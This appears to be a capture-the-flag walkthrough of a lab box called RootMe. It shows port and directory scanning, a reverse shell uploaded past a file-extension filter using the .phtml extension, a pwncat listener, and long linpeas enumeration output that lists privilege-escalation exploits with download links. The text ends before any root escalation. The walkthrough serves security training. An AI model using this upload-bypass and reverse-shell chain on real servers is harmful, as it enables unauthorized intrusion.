# RootMe

Laurent Chauvin | October 30, 2022

## Resources

## Progress

export IP=10.10.240.119

```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-30 23:13 EDT
Nmap scan report for 10.10.240.119
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.15 seconds

```

2 ports open (ssh and http).

Running Apache 2.4.29.

```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.240.119
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/30 23:15:38 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 316] [--> http://10.10.240.119/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.240.119/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.240.119/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.240.119/panel/]
```

Upload php-reverse-shell.php from pentestmonkey to /panel.

.php not allowed. Renamed to .phtml.


Run pwncat:

```
cd /opt/pwncat
poetry shell
pwncat-cs -lp 9999
```

Go to:

```
http://10.10.240.119/uploads/revshell.phtml
```

Show first flag:
```
cat /var/www/user.txt
```

Use Ctrl+D on pwncat to switch between remote and local.

On (local):

```
(local) pwncat$ escalate list
[00:00:26] warning: no direct escalations found      
```

From pwncat, upload linpea.sh
```
(remote) www-data@rootme:/$ cd /dev/shm   
(remote) www-data@rootme:/dev/shm$ 
(local) pwncat$ upload /opt/linpeas.sh
./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 827.8/827.8 KB • ? • 0:00:00
[00:06:57] uploaded 827.83KiB in 6.28 seconds                                                                                                                                                                                   upload.py:77
(local) pwncat$                                                                                                                                                                                                                             
(remote) www-data@rootme:/dev/shm$ chmod +x linpeas.sh
(remote) www-data@rootme:/dev/shm$ ./linpeas.sh
```

```
(remote) www-data@rootme:/dev/shm$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: rootme
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE
                                                                                                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                                          
Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020                                                                                     
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                             
Sudo version 1.8.21p2                                                                                                                                                                                                                       

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                                                                                                 

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                     
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                                                                                      
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Mon Oct 31 04:08:06 UTC 2022                                                                                                                                                                                                                
 04:08:06 up 58 min,  0 users,  load average: 0.15, 0.03, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
/dev/disk/by-uuid/275199f0-1298-4482-af79-f890507c2336  /       ext4    defaults        0 0                                                                                                                                                 

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
HISTFILESIZE=0                                                                                                                                                                                                                              
SHLVL=2
OLDPWD=/
PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:19033
_=./linpeas.sh
TERM=xterm-256color
HISTCONTROL=ignorespace
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=904ce6dc26f9404198d345ffbf3c79bf
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/dev/shm
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                                                                                      
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
cat: write error: Broken pipe                                                                                                                                                                                                               
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                     
                                                                                                                                                                                                                                            
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                                               
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                                                                                                                                                               

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present
/usr/bin/lxc                                                                                                                                                                                                                                
╔══════════╣ Am I Containered?
╔══════════╣ Container details                                                                                                                                                                                                              
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                                                                                                      
                                                                                                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0e8a869eedb08a4ca                                                                                                                                                                                                               
instance-action: none
instance-id: i-0528468b20396fe31
instance-life-cycle: on-demand
instance-type: t2.nano
region: eu-west-1

══╣ Account Info
{                                                                                                                                                                                                                                           
  "Code" : "Success",
  "LastUpdated" : "2022-10-31T03:46:27Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:e8:52:91:71:2b/                                                                                                                                                                                                                     
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
                                                                                                                                                                                                                                            

══╣ User Data
                                                                                                                                                                                                                                            

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                 
root         1  0.8  1.8 159780  8944 ?        Ss   03:09   0:29 /sbin/init auto automatic-ubiquity noprompt                                                                                                                                
root       401  0.0  3.4  94876 16716 ?        S<s  03:10   0:02 /lib/systemd/systemd-journald
root       429  0.0  0.3  97708  1872 ?        Ss   03:10   0:00 /sbin/lvmetad -f
root       431  0.1  0.8  45652  4384 ?        Ss   03:10   0:06 /lib/systemd/systemd-udevd
systemd+   482  0.0  0.6 141952  3080 ?        Ssl  03:10   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   669  0.0  1.0  80068  4960 ?        Ss   03:11   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   684  0.0  0.9  70656  4868 ?        Ss   03:11   0:00 /lib/systemd/systemd-resolved
root       785  0.0  0.3 621476  1728 ?        Ssl  03:11   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
syslog     794  0.0  0.7 263040  3824 ?        Ssl  03:11   0:00 /usr/sbin/rsyslogd -n
root       795  0.0  1.1  62156  5776 ?        Ss   03:11   0:00 /lib/systemd/systemd-logind
root       800  0.0  2.8 169144 13764 ?        Ssl  03:11   0:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       805  0.0  0.6  30028  2964 ?        Ss   03:11   0:00 /usr/sbin/cron -f
message+   810  0.0  0.8  50064  4260 ?        Ss   03:11   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       829  0.0  3.1 185948 15480 ?        Ssl  03:11   0:02 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       835  0.0  1.3 286256  6444 ?        Ssl  03:11   0:00 /usr/lib/accountsservice/accounts-daemon[0m
daemon[0m     840  0.0  0.4  28332  2128 ?        Ss   03:11   0:00 /usr/sbin/atd -f
root       841  0.4  5.3 636668 26164 ?        Ssl  03:11   0:15 /usr/lib/snapd/snapd
root       851  0.0  0.4  14664  2076 ttyS0    Ss+  03:11   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       855  0.0  1.2  72300  6216 ?        Ss   03:11   0:00 /usr/sbin/sshd -D
root       857  0.0  1.3 291496  6664 ?        Ssl  03:11   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       862  0.0  0.3  14888  1748 tty1     Ss+  03:11   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root       899  0.0  2.4 327124 11828 ?        Ss   03:11   0:00 /usr/sbin/apache2 -k start
www-data   913  0.0  2.1 331780 10428 ?        S    03:11   0:00  _ /usr/sbin/apache2 -k start
www-data   916  0.0  2.6 331972 13224 ?        S    03:11   0:00  _ /usr/sbin/apache2 -k start
www-data   917  0.0  2.3 331780 11492 ?        S    03:11   0:00  _ /usr/sbin/apache2 -k start
www-data  1440  0.0  0.1   4628   728 ?        S    03:56   0:00  |   _ sh -c uname -a; w; id; /bin/sh -i
www-data  1444  0.0  0.6  18376  3008 ?        S    03:56   0:00  |       _ /bin/bash
www-data  1464  0.0  0.4  19308  2220 ?        S    03:56   0:00  |           _ /usr/bin/script -qc /bin/bash /dev/null
www-data  1465  0.0  0.1   4628   788 pts/0    Ss   03:56   0:00  |               _ sh -c /bin/bash
www-data  1466  0.0  0.7  18508  3496 pts/0    S    03:56   0:00  |                   _ /bin/bash
www-data  1646  0.3  0.5   5508  2660 pts/0    S+   04:07   0:00  |                       _ /bin/sh ./linpeas.sh
www-data  5034  0.0  0.1   5508   976 pts/0    S+   04:08   0:00  |                           _ /bin/sh ./linpeas.sh
www-data  5038  0.0  0.6  36844  3264 pts/0    R+   04:08   0:00  |                           |   _ ps fauxwww
www-data  5037  0.0  0.1   5508   976 pts/0    S+   04:08   0:00  |                           _ /bin/sh ./linpeas.sh
www-data  1294  0.0  2.9 331976 14400 ?        S    03:15   0:00  _ /usr/sbin/apache2 -k start
www-data  1300  0.0  1.8 331584  9032 ?        S    03:15   0:00  _ /usr/sbin/apache2 -k start
www-data  1302  0.0  2.6 331980 13168 ?        S    03:15   0:00  _ /usr/sbin/apache2 -k start
www-data  1303  0.0  1.8 331584  9032 ?        S    03:15   0:00  _ /usr/sbin/apache2 -k start
www-data  1304  0.0  2.6 331976 12952 ?        S    03:15   0:00  _ /usr/sbin/apache2 -k start
www-data  1307  0.0  2.6 331980 13168 ?        S    03:15   0:00  _ /usr/sbin/apache2 -k start
www-data  1320  0.0  1.8 331584  9036 ?        S    03:23   0:00  _ /usr/sbin/apache2 -k start

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                          
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                                                                                                                                                             

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                                                                          
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                                                                                                              
lightdm Not Found                                                                                                                                                                                                                           
vsftpd Not Found                                                                                                                                                                                                                            
apache2 process found (dump creds from memory as root)                                                                                                                                                                                      
sshd Not Found
                                                                                                                                                                                                                                            
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                      
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 28
drwxr-xr-x  2 root root 4096 Aug  4  2020 .
drwxr-xr-x 96 root root 4096 Aug  4  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  607 Jun  3  2013 john
-rw-r--r--  1 root root  589 Jan 14  2020 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  191 Feb  3  2020 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Aug  4  2020 .
drwxr-xr-x 96 root root 4096 Aug  4  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 96 root root 4096 Aug  4  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 96 root root 4096 Aug  4  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 96 root root 4096 Aug  4  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                                                                              
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                                                                                 

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                                                                                 
You can't write on systemd PATH                                                                                                                                                                                                             

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES                                                                                                                    
Mon 2022-10-31 04:09:00 UTC  45s left      Mon 2022-10-31 03:39:43 UTC  28min ago phpsessionclean.timer        phpsessionclean.service
Mon 2022-10-31 06:03:02 UTC  1h 54min left Mon 2022-10-31 03:11:34 UTC  56min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2022-10-31 13:15:17 UTC  9h left       Mon 2022-10-31 03:11:34 UTC  56min ago apt-daily.timer              apt-daily.service
Mon 2022-10-31 18:32:30 UTC  14h left      Mon 2022-10-31 03:11:34 UTC  56min ago motd-news.timer              motd-news.service
Tue 2022-11-01 03:24:45 UTC  23h left      Mon 2022-10-31 03:24:45 UTC  43min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2022-11-07 00:00:00 UTC  6 days left   Mon 2022-10-31 03:11:34 UTC  56min ago fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a       snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                                                                                 
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
